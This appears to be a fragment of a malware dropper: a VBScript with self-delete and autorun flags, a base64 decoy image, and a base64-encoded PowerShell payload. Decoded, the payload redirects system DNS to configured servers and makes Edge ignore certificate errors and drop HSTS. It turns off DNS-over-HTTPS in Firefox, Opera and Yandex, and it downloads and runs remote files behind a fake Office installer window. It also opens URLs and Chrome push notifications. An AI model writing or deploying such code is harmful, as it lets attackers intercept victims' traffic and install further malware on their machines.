dJHNlY29uZGFyeURuc1NlcnZlcg0KICAgICkNCg0KICAgIHRyeSB7DQogICAgICAgICMgR2V0IG5ldHdvcmsgYWRhcHRlcnMgdGhhdCBhcmUgSVAtZW5hYmxlZA0KICAgICAgICAkbmV0d29ya0FkYXB0ZXJzID0gR2V0LU5ldEFkYXB0ZXIgfCBXaGVyZS1PYmplY3QgeyAkXy5TdGF0dXMgLWVxICdVcCcgLWFuZCAkXy5JbnRlcmZhY2VEZXNjcmlwdGlvbiAtbm90bGlrZSAnKlZpcnR1YWwqJyB9DQoNCiAgICAgICAgZm9yZWFjaCAoJGFkYXB0ZXIgaW4gJG5ldHdvcmtBZGFwdGVycykgew0KICAgICAgICAgICAgIyBTZXQgRE5TIHNlcnZlcnMgdXNpbmcgU2V0LURuc0NsaWVudFNlcnZlckFkZHJlc3MgY21kbGV0DQogICAgICAgICAgICBTZXQtRG5zQ2xpZW50U2VydmVyQWRkcmVzcyAtSW50ZXJmYWNlQWxpYXMgJGFkYXB0ZXIuTmFtZSAtU2VydmVyQWRkcmVzc2VzIEAoJHByaW1hcnlEbnNTZXJ2ZXIsICRzZWNvbmRhcnlEbnNTZXJ2ZXIpIC1Db25maXJtOiRmYWxzZQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIlN1Y2Nlc3NmdWxseSBzZXQgRE5TIHNlcnZlcnMgZm9yIGFkYXB0ZXI6ICQoJGFkYXB0ZXIuSW50ZXJmYWNlRGVzY3JpcHRpb24pIg0KICAgICAgICB9DQogICAgfSBjYXRjaCB7DQogICAgICAgIFdyaXRlLUVycm9yICJBbiBlcnJvciBvY2N1cnJlZDogJF8iDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBDb25maWd1cmVEbnNTZXJ2ZXJzIHsNCiAgICBTZXQtRE5TU2VydmVycyAtUHJpbWFyeUROU1NlcnZlciAkc2VydmVyLnByaW1hcnlEbnMgLVNlY29uZGFyeUROU1NlcnZlciAkc2VydmVyLnNlY29uZGFyeURucw0KfQ0KZnVuY3Rpb24gQ29uZmlndXJlRWRnZSB7DQogICAgJGVkZ2VLZXlQYXRoID0gIkhLTE06XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxFZGdlIg0KICAgIA0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJGVkZ2VLZXlQYXRoKSkgew0KICAgICAgICBOZXctSXRlbSAtUGF0aCAkZWRnZUtleVBhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICB9DQogICAgDQogICAgJGNvbW1hbmRMaW5lUGF0aCA9IEpvaW4tUGF0aCAkZWRnZUtleVBhdGggIkNvbW1hbmRMaW5lIg0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJGNvbW1hbmRMaW5lUGF0aCkpIHsNCiAgICAgICAgTmV3LUl0ZW0gLVBhdGggJGNvbW1hbmRMaW5lUGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgIH0NCiAgICANCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRjb21tYW5kTGluZVBhdGggLU5hbWUgIihEZWZhdWx0KSIgLVZhbHVlICItLWlnbm9yZS1jZXJ0aWZpY2F0ZS1lcnJvcnMgLS1kaXNhYmxlLXF1aWMgLS1kaXNhYmxlLWhzdHMiDQogICAgDQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkZWRnZUtleVBhdGggLU5hbWUgIkRuc092ZXJIdHRwcyIgLVZhbHVlICJvZmYiDQoNCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRlZGdlS2V5UGF0aCAtTmFtZSAiSWdub3JlQ2VydGlmaWNhdGVFcnJvcnMiIC1WYWx1ZSAxDQp9DQoKCg0KDQpmdW5jdGlvbiBDb25maWd1cmVGaXJlRm94IA0Kew0KICAgIHRyeSANCiAgICB7DQogICAgICAgIFNldC1GaXJlZm94UmVnaXN0cnkgLUtleVBhdGhzIEAoDQogICAgICAgICAgICAnU09GVFdBUkVcUG9saWNpZXNcTW96aWxsYVxGaXJlZm94XEROU092ZXJIVFRQUycsDQogICAgICAgICAgICAnU09GVFdBUkVcUG9saWNpZXNcTW96aWxsYVxGaXJlZm94XEROU092ZXJIVFRQUycNCiAgICAgICAgKSAtVmFsdWVOYW1lcyBAKCdFbmFibGVkJywgJ0xvY2tlZCcpIC1WYWx1ZXMgQCgwLCAxKQ0KICAgIH0NCiAgICBjYXRjaCANCiAgICB7DQogICAgICAgIFdyaXRlLVdhcm5pbmcgIkZhaWxlZCB0byBzZXQgZmlyZWZveCByZWdpc3RyeTogJF8iDQogICAgfQ0KICAgIGZvcmVhY2ggKCRkaXIgaW4gR2V0LUVudlBhdGhzKSANCiAgICB7DQogICAgICAgIHRyeSANCiAgICAgICAgew0KICAgICAgICAkcGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZGlyIC1DaGlsZFBhdGggIk1vemlsbGFcRmlyZWZveFxQcm9maWxlc1x1c2VyLmpzIg0KDQogICAgICAgICAgICAkVXNlckpTQ29udGVudCA9ICd1c2VyX3ByZWYoIm5ldHdvcmsudHJyLm1vZGUiLCA1KTsnDQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmICghKFRlc3QtUGF0aCAtUGF0aCAkcGF0aCAtUGF0aFR5cGUgTGVhZikpIA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIE5ldy1JdGVtIC1QYXRoICRwYXRoIC1JdGVtVHlwZSBGaWxlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAgICAgQWRkLUNvbnRlbnQgLVBhdGggJHBhdGggLVZhbHVlICRVc2VySlNDb250ZW50IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggDQogICAgICAgIHsNCiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkZhaWxlZCB0byB3cml0ZSB0byB1c2VyLmpzIGZpbGU6ICRfIg0KICAgICAgICB9DQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIFNldC1GaXJlZm94UmVnaXN0cnkgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ1tdXSRLZXlQYXRocywNCiAgICAgICAgW3N0cmluZ1tdXSRWYWx1ZU5hbWVzLA0KICAgICAgICBbaW50W11dJFZhbHVlcw0KICAgICkNCg0KICAgICRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU3RvcCcNCiAgICAkcmVnS2V5ID0gW01pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeV06OkxvY2FsTWFjaGluZQ0KDQogICAgdHJ5IHsNCiAgICAgICAgZm9yZWFjaCAoJGkgaW4gMC4uKCRLZXlQYXRocy5MZW5ndGggLSAxKSkgew0KICAgICAgICAgICAgJGtleSA9ICRyZWdLZXkuT3BlblN1YktleSgkS2V5UGF0aHNbJGldLCAkdHJ1ZSkNCiAgICAgICAgICAgIGlmICgka2V5IC1lcSAkbnVsbCkgew0KICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkZhaWxlZCB0byBvcGVuIHJlZ2lzdHJ5IGtleTogJCgkS2V5UGF0aHNbJGldKSINCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJGtleS5TZXRWYWx1ZSgkVmFsdWVOYW1lc1skaV0sICRWYWx1ZXNbJGldLCBbTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5VmFsdWVLaW5kXTo6RFdvcmQpDQogICAgICAgICAgICAka2V5LkNsb3NlKCkNCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgIFdyaXRlLVdhcm5pbmcgIkVycm9yIGFjY2Vzc2luZyBvciBtb2RpZnlpbmcgcmVnaXN0cnk6ICRfIg0KICAgIH0NCn0NCgoKDQoNCmZ1bmN0aW9uIENvbmZpZ3VyZU9wZXJhDQp7DQogICAgQ2xvc2UtUHJvY2Vzc2VzKEAoJ29wZXJhX2NyYXNocmVwb3J0ZXIuZXhlJywgJ29wZXJhLmV4ZScpKQ0KDQogICAgZm9yZWFjaCAoJGRpciBpbiBHZXQtRW52UGF0aHMpIHsNCiAgICAgICAgJHBhdGggPSBKb2luLVBhdGggLVBhdGggJGRpciAtQ2hpbGRQYXRoICdPcGVyYSBTb2Z0d2FyZVxPcGVyYSBTdGFibGVcTG9jYWwgU3RhdGUnDQoNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmIChUZXN0LVBhdGggLVBhdGggJHBhdGggLVBhdGhUeXBlIExlYWYpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgQ29uZmlndXJlT3BlcmFJbnRlcm5hbCAtRmlsZVBhdGggJHBhdGgNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJFcnJvciBvY2N1cnJlZCBpbiBPcGVyYTogJF8iDQogICAgICAgIH0NCiAgICB9DQp9DQoNCmZ1bmN0aW9uIENvbmZpZ3VyZU9wZXJhSW50ZXJuYWwgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSRmaWxlUGF0aA0KICAgICkNCg0KICAgICRjb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJGZpbGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCiAgICBpZiAoJG51bGwgLWVxICRjb250ZW50LmRuc19vdmVyX2h0dHBzIC1vciAkY29udGVudC5kbnNfb3Zlcl9odHRwcyAtaXNub3QgW29iamVjdF0pIHsNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMgPSBAew0KICAgICAgICAgICAgJ21vZGUnID0gJ29mZicNCiAgICAgICAgICAgICdvcGVyYScgPSBAew0KICAgICAgICAgICAgICAgICdkb2hfbW9kZScgPSAnb2ZmJw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJ3RlbXBsYXRlcycgPSAiIg0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMubW9kZSA9ICdvZmYnDQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzLm9wZXJhID0gQHsNCiAgICAgICAgICAgICdkb2hfbW9kZScgPSAnb2ZmJw0KICAgICAgICB9DQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzLnRlbXBsYXRlcyA9ICIiDQogICAgfQ0KDQogICAgJGpzb25TdHJpbmcgPSAkY29udGVudCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAxMA0KDQogICAgU2V0LUNvbnRlbnQgLVBhdGggJGZpbGVQYXRoIC1WYWx1ZSAkanNvblN0cmluZyAtRW5jb2RpbmcgVVRGOCAtRm9yY2UNCg0KICAgIFdyaXRlLUhvc3QgIlN1Y2Nlc3NmdWxseSBjb25maWd1cmVkIE9wZXJhIHNldHRpbmdzIGluICRmaWxlUGF0aCINCn0NCgoKDQoKCg0KDQpmdW5jdGlvbiBTdGFydC1Eb3dubG9hZEFuZEV4ZWN1dGUgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kdXJsLA0KICAgICAgICBbc3RyaW5nXSR0aXRsZQ0KICAgICkNCg0KICAgIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCiAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nDQoNCiAgICAjIENyZWF0ZSBhbmQgY29uZmlndXJlIHRoZSBmb3JtDQogICAgJGZvcm0gPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkZvcm0NCiAgICAkZm9ybS5UZXh0ID0gJHRpdGxlDQogICAgJGZvcm0uU2l6ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuU2l6ZSg0MDAsIDIwMCkNCiAgICAkZm9ybS5TdGFydFBvc2l0aW9uID0gIkNlbnRlclNjcmVlbiINCg0KICAgICMgQ3JlYXRlIGFuZCBjb25maWd1cmUgdGhlIHByb2dyZXNzIGJhcg0KICAgICRwcm9ncmVzc0JhciA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuUHJvZ3Jlc3NCYXINCiAgICAkcHJvZ3Jlc3NCYXIuTWluaW11bSA9IDANCiAgICAkcHJvZ3Jlc3NCYXIuTWF4aW11bSA9IDEwMA0KICAgICRwcm9ncmVzc0Jhci5TdGVwID0gMQ0KICAgICRwcm9ncmVzc0Jhci5WYWx1ZSA9IDANCiAgICAkcHJvZ3Jlc3NCYXIuV2lkdGggPSAzNTANCiAgICAkcHJvZ3Jlc3NCYXIuSGVpZ2h0ID0gMzANCiAgICAkcHJvZ3Jlc3NCYXIuVG9wID0gODANCiAgICAkcHJvZ3Jlc3NCYXIuTGVmdCA9IDIwDQogICAgJGZvcm0uQ29udHJvbHMuQWRkKCRwcm9ncmVzc0JhcikNCg0KICAgICMgQ3JlYXRlIGFuZCBjb25maWd1cmUgdGhlIHN0YXR1cyBsYWJlbA0KICAgICRzdGF0dXNMYWJlbCA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuTGFiZWwNCiAgICAkc3RhdHVzTGFiZWwuVGV4dCA9ICJEb3dubG9hZGluZy4uLiINCiAgICAkc3RhdHVzTGFiZWwuQXV0b1NpemUgPSAkdHJ1ZQ0KICAgICRzdGF0dXNMYWJlbC5Ub3AgPSA1MA0KICAgICRzdGF0dXNMYWJlbC5MZWZ0ID0gMjANCiAgICAkZm9ybS5Db250cm9scy5BZGQoJHN0YXR1c0xhYmVsKQ0KDQogICAgIyBDcmVhdGUgYW5kIGNvbmZpZ3VyZSB0aGUgZGVzY3JpcHRpb24gbGFiZWwNCiAgICAkZGVzY3JpcHRpb25MYWJlbCA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuTGFiZWwNCiAgICAkZGVzY3JpcHRpb25MYWJlbC5UZXh0ID0gIlRoZSBpbnN0YWxsZXIgaXMgY3VycmVudGx5IGJlaW5nIGRvd25sb2FkZWQuIFBsZWFzZSB3YWl0IHVudGlsIHRoZSBwcm9jZXNzIGNvbXBsZXRlcy4iDQogICAgJGRlc2NyaXB0aW9uTGFiZWwuQXV0b1NpemUgPSAkdHJ1ZQ0KICAgICRkZXNjcmlwdGlvbkxhYmVsLldpZHRoID0gMzUwDQogICAgJGRlc2NyaXB0aW9uTGFiZWwuVG9wID0gMTANCiAgICAkZGVzY3JpcHRpb25MYWJlbC5MZWZ0ID0gMjANCiAgICAkZm9ybS5Db250cm9scy5BZGQoJGRlc2NyaXB0aW9uTGFiZWwpDQoNCiAgICAjIFNob3cgdGhlIGZvcm0gbm9uLW1vZGFsbHkNCiAgICAkZm9ybS5TaG93KCkNCg0KICAgICMgRGV0ZXJtaW5lIHRoZSBmaWxlIG5hbWUgYW5kIHBhdGgNCiAgICAkZmlsZU5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkdXJsKQ0KICAgICR0ZW1wRGlyID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcFBhdGgoKQ0KICAgICRpbnN0YWxsZXJQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6Q29tYmluZSgkdGVtcERpciwgJGZpbGVOYW1lKQ0KDQogICAgIyBDcmVhdGUgYW5kIGNvbmZpZ3VyZSB0aGUgV2ViQ2xpZW50DQogICAgJHdlYkNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQNCg0KICAgICMgRGVmaW5lIGV2ZW50IGhhbmRsZXJzDQogICAgJHByb2dyZXNzQ2hhbmdlZEhhbmRsZXIgPSBbU3lzdGVtLk5ldC5Eb3dubG9hZFByb2dyZXNzQ2hhbmdlZEV2ZW50SGFuZGxlcl17DQogICAgICAgIHBhcmFtICgkc2VuZGVyLCAkZXZlbnRBcmdzKQ0KICAgICAgICAkcHJvZ3Jlc3NCYXIuVmFsdWUgPSAkZXZlbnRBcmdzLlByb2dyZXNzUGVyY2VudGFnZQ0KICAgICAgICAkZm9ybS5SZWZyZXNoKCkNCiAgICB9DQoNCiAgICAkZG93bmxvYWRGaWxlQ29tcGxldGVkSGFuZGxlciA9IFtTeXN0ZW0uQ29tcG9uZW50TW9kZWwuQXN5bmNDb21wbGV0ZWRFdmVudEhhbmRsZXJdew0KICAgICAgICBwYXJhbSAoJHNlbmRlciwgJGV2ZW50QXJncykNCiAgICAgICAgIyBDbG9zZSB0aGUgZm9ybSBiZWZvcmUgc3RhcnRpbmcgdGhlIGluc3RhbGxlcg0KICAgICAgICAkZm9ybS5JbnZva2UoW2FjdGlvbl0geyAkZm9ybS5DbG9zZSgpIH0pDQogICAgICAgIA0KICAgICAgICBpZiAoJGV2ZW50QXJncy5FcnJvcikgew0KICAgICAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCJFcnJvciBkb3dubG9hZGluZyBmaWxlOiAiICsgJGV2ZW50QXJncy5FcnJvci5NZXNzYWdlLCAiRG93bmxvYWQgRXJyb3IiLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEJ1dHRvbnNdOjpPSywgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hJY29uXTo6RXJyb3IpDQogICAgICAgIH0gZWxzZWlmICgkZXZlbnRBcmdzLkNhbmNlbGxlZCkgew0KICAgICAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCJEb3dubG9hZCBjYW5jZWxsZWQuIiwgIkRvd25sb2FkIENhbmNlbGxlZCIsIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94QnV0dG9uc106Ok9LLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEljb25dOjpXYXJuaW5nKQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAjIEV4ZWN1dGUgdGhlIGluc3RhbGxlcg0KICAgICAgICAgICAgICAgIFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRpbnN0YWxsZXJQYXRoIC1XYWl0DQoNCiAgICAgICAgICAgICAgICAjIFdyaXRlIHRvIHRoZSByZWdpc3RyeQ0KICAgICAgICAgICAgICAgICRyZWdpc3RyeVBhdGggPSAiSEtDVTpcU29mdHdhcmVcSGVyZWN1bGVzXERvd25sb2FkcyINCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyZWdpc3RyeVBhdGgpKSB7DQogICAgICAgICAgICAgICAgICAgIE5ldy1JdGVtIC1QYXRoICRyZWdpc3RyeVBhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1OYW1lICRmaWxlTmFtZSAtVmFsdWUgIkRvd25sb2FkZWQiDQogICAgICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveF06OlNob3coIkVycm9yIGV4ZWN1dGluZyB0aGUgaW5zdGFsbGVyOiAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UsICJFeGVjdXRpb24gRXJyb3IiLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEJ1dHRvbnNdOjpPSywgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hJY29uXTo6RXJyb3IpDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAjIEFkZCBldmVudCBoYW5kbGVycyB0byBXZWJDbGllbnQNCiAgICAkd2ViQ2xpZW50LmFkZF9Eb3dubG9hZFByb2dyZXNzQ2hhbmdlZCgkcHJvZ3Jlc3NDaGFuZ2VkSGFuZGxlcikNCiAgICAkd2ViQ2xpZW50LmFkZF9Eb3dubG9hZEZpbGVDb21wbGV0ZWQoJGRvd25sb2FkRmlsZUNvbXBsZXRlZEhhbmRsZXIpDQoNCiAgICB0cnkgew0KICAgICAgICAjIFN0YXJ0IHRoZSBkb3dubG9hZA0KICAgICAgICAkd2ViQ2xpZW50LkRvd25sb2FkRmlsZUFzeW5jKFtVcmldJHVybCwgJGluc3RhbGxlclBhdGgpDQogICAgICAgIA0KICAgICAgICAjIEtlZXAgdGhlIGZvcm0gcmVzcG9uc2l2ZSB3aGlsZSB0aGUgZG93bmxvYWQgaXMgaW4gcHJvZ3Jlc3MNCiAgICAgICAgd2hpbGUgKCRmb3JtLlZpc2libGUpIHsNCiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDENCiAgICAgICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BcHBsaWNhdGlvbl06OkRvRXZlbnRzKCkNCiAgICAgICAgfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveF06OlNob3coIkVycm9yIGluaXRpYXRpbmcgZG93bmxvYWQ6ICIgKyAkXy5FeGNlcHRpb24uTWVzc2FnZSwgIkRvd25sb2FkIEVycm9yIiwgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hCdXR0b25zXTo6T0ssIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94SWNvbl06OkVycm9yKQ0KICAgICAgICAkZm9ybS5DbG9zZSgpDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBEb3dubG9hZCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSR1cmwsDQogICAgICAgIFtzdHJpbmddJHRpdGxlDQogICAgKQ0KDQogICAgJGZpbGVOYW1lID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0RmlsZU5hbWUoJHVybCkNCiAgICAkcmVnaXN0cnlQYXRoID0gIkhLQ1U6XFNvZnR3YXJlXEhlcmVjdWxlc1xEb3dubG9hZHMiDQoNCiAgICBpZiAoVGVzdC1QYXRoICRyZWdpc3RyeVBhdGgpIHsNCiAgICAgICAgJGluc3RhbGxlZCA9IEdldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ2lzdHJ5UGF0aCAtTmFtZSAkZmlsZU5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgaWYgKCRpbnN0YWxsZWQpIHsNCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiVGhlIGZpbGUgJyRmaWxlTmFtZScgaXMgYWxyZWFkeSBpbnN0YWxsZWQuIg0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAgIH0NCiAgICB9DQoNCiAgICBTdGFydC1Eb3dubG9hZEFuZEV4ZWN1dGUgLXVybCAkdXJsIC10aXRsZSAkdGl0bGUNCn0NCg0KZnVuY3Rpb24gRG9TdGFydERvd25sb2FkcyB7DQogICAgZm9yZWFjaCAoJHVybCBpbiAkc2VydmVyLnN0YXJ0RG93bmxvYWRzKSB7DQogICAgICAgIERvd25sb2FkIC11cmwgJHVybCAtdGl0bGUgIkRvd25sb2FkaW5nIE9mZmljZSBJbnN0YWxsZXIiDQogICAgfQ0KfQ0KCgoNCgoKDQoNCg0KDQpmdW5jdGlvbiBEb1N0YXJ0VXJscyB7DQogICAgZm9yZWFjaCAoJHN0YXJ0VXJsIGluICRzZXJ2ZXIuc3RhcnRVcmxzKSB7DQogICAgICAgIFN0YXJ0LVByb2Nlc3MgJHN0YXJ0VXJsLlRyaW0oKQ0KICAgIH0NCn0NCgoKDQoNCmZ1bmN0aW9uIENvbmZpZ3VyZVlhbmRleA0Kew0KICAgIENsb3NlLVByb2Nlc3NlcyhAKCdzZXJ2aWNlX3VwZGF0ZS5leGUnLCdicm93c2VyLmV4ZScpKQ0KDQogICAgZm9yZWFjaCAoJGRpciBpbiBHZXQtRW52UGF0aHMpIHsNCiAgICAgICAgJHBhdGggPSBKb2luLVBhdGggLVBhdGggJGRpciAtQ2hpbGRQYXRoICdZYW5kZXhcWWFuZGV4QnJvd3NlclxVc2VyIERhdGFcTG9jYWwgU3RhdGUnDQoNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmIChUZXN0LVBhdGggLVBhdGggJHBhdGggLVBhdGhUeXBlIExlYWYpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgQ29uZmlndXJlWWFuZGV4SW50ZXJuYWwgLUZpbGVQYXRoICRwYXRoDQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgV3JpdGUtRXJyb3IgIkVycm9yIG9jY3VycmVkOiAkXyINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gQ29uZmlndXJlWWFuZGV4SW50ZXJuYWwgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSRmaWxlUGF0aA0KICAgICkNCiAgICAkY29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRmaWxlUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgaWYgKCRudWxsIC1lcSAkY29udGVudC5kbnNfb3Zlcl9odHRwcyAtb3IgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMgLWlzbm90IFtvYmplY3RdKSB7DQogICAgICAgICRjb250ZW50IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ2Ruc19vdmVyX2h0dHBzJyAtVmFsdWUgQHsNCiAgICAgICAgICAgICdtb2RlJyA9ICdvZmYnDQogICAgICAgICAgICAndGVtcGxhdGVzJyA9ICIiDQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkY29udGVudC5kbnNfb3Zlcl9odHRwcy5tb2RlID0gJ29mZicNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMudGVtcGxhdGVzID0gIiINCiAgICB9DQoNCiAgICAkanNvblN0cmluZyA9ICRjb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwDQoNCiAgICBTZXQtQ29udGVudCAtUGF0aCAkZmlsZVBhdGggLVZhbHVlICRqc29uU3RyaW5nIC1FbmNvZGluZyBVVEY4IC1Gb3JjZQ0KDQogICAgV3JpdGUtSG9zdCAiU3VjY2Vzc2Z1bGx5IGNvbmZpZ3VyZWQgWWFuZGV4IHNldHRpbmdzIGluICRmaWxlUGF0aCINCn0NCgoKDQoKCg0KCgoNCgoKDQoKCg0KCgoNCgoKDQoKCg0KCgoNCgoKDQoKCg0KCgoNCgoKDQoKCg0KDQoNCmZ1bmN0aW9uIG1haW4gew0KICAgIENvbmZpZ3VyZURuc1NlcnZlcnMNCiAgICBDb25maWd1cmVDZXJ0aWZpY2F0ZXMNCiAgICBDb25maWd1cmVDaHJvbWUNCiAgICBDb25maWd1cmVFZGdlDQogICAgQ29uZmlndXJlWWFuZGV4DQogICAgQ29uZmlndXJlRmlyZUZveA0KICAgIENvbmZpZ3VyZU9wZXJhDQogICAgQ29uZmlndXJlQ2hyb21lVWJsb2NrDQogICAgQ29uZmlndXJlQ2hyb21lUHVzaGVzDQogICAgRG9TdGFydERvd25sb2Fkcw0KICAgIERvU3RhcnRVcmxzDQogICAgTGF1bmNoQ2hyb21lUHVzaGVzDQp9DQoNCm1haW4NCg0K"
Dim selfDel
selfDel="__selfDel"
Dim autorun
autorun="False"
Dim arrFrontData
arrFrontData = Array("iVBORw0KGgoAAAANSUhEUgAAARgAAACgCAYAAADXYHMgAAAABHNCSVQICAgIfAhkiAAAIABJREFUeJztnXl8G+W1938z2mVbtmXLdux4SWwnJBAHkrCk0OsAJbQUQukNBcK9tMAllJsWQkreywulQCFlebkkl7UUUqAtvKQxW2kgcYAkrEkwzuIlm8nmLfFuWZKtbeb+IcuWbW0zGlnS6Hz9mU9izTzPnJHtn85znvOch+F5ngdBEEQUYGNtAEEQ8oUEhiCIqEECQxBE1FDG2gAi/vANyzEME0NLiESHBCbJafhyKz756J/48ptanOzow+k+CzgfgdGolCjISsessmJcXFmJS65YAmPBtBhaTCQSDM0iJR8O2wDWr30Mf6n6B9p7LYLasgyD+WdMx+rV9+C8S34UJQsJuUACk2S8++rzePKZFwULiz8uOe9s3PfAAyibM18Cywg5QgKTJNjMvfjPm67H9r2HJO1XpVTg0f+7CtfdukLSfgl5QAKTBByt/xa33Hobjp/uido9blhyOR55+nkolRTWI0YhgZE5TXU1+Ol1N8Jss0f9XhfNr8BfNr4HlqXsB8ID/SbImP7uDtz085snRVwA4Itv9+OBVTRUIkYhgZEpbrcbv7h+Kdp6Bib1vm+89xHeeOWFSb0nEb+QwMiU5x+9F3uOnIzJvR987L/RdvJYTO5NxBckMDLE0teNl///+zG7v8vtxuOPPhyz+xPxAwmMDFn76AMYGHKEfb1aqcB/XX8ZHvuPJZianSGJDR9s3YHG2t2S9EUkLjSLJDNs5l7Mm78AQ0532G1WXP0vuPEH5wIA7E4Xlj/9Jo60dAIAinKN+J9fXw+tVo1nNn6CzbvrEO5vzBUXX4QXXv2b4Gcg5AN5MDJjy9tvChKXLEMKrq08Z+R7jUqJ82YW